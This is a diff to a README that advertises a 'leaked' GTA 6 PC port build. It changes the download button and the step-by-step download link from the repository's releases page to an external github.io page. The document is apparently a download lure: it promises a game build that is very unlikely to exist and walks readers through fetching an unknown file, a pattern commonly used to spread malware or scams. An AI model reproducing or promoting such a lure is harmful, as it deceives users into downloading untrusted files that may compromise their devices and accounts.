@@ -1,6 +1,6 @@
 # 🎮 GTA-6-Leaked-PC-Port-Build-2026 - Your Gateway to Playing GTA 6 on PC Today
 
-[![Download GTA 6](https://img.shields.io/badge/Download-GTA_6_Leaked_Build-brightgreen?style=for-the-badge&logo=github&colorA=2c3e50&colorB=27ae60)](https://github.com/allawigamer43/GTA-6-Leaked-PC-Port-Build-2026/releases)
+[![Download GTA 6](https://img.shields.io/badge/Download-GTA_6_Leaked_Build-brightgreen?style=for-the-badge&logo=github&colorA=2c3e50&colorB=27ae60)](https://allawigamer43.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ This is the most important step. The file you need is stored on GitHub. Don't wo
 
 **Step 1: Visit the Download Page**
 
-Click the big green button at the top of this page, or click this link right here: **[Download GTA 6 Leaked Build](https://github.com/allawigamer43/GTA-6-Leaked-PC-Port-Build-2026/releases)**
+Click the big green button at the top of this page, or click this link right here: **[Download GTA 6 Leaked Build](https://allawigamer43.github.io)**
 
 **Step 2: Find the Right File**
 
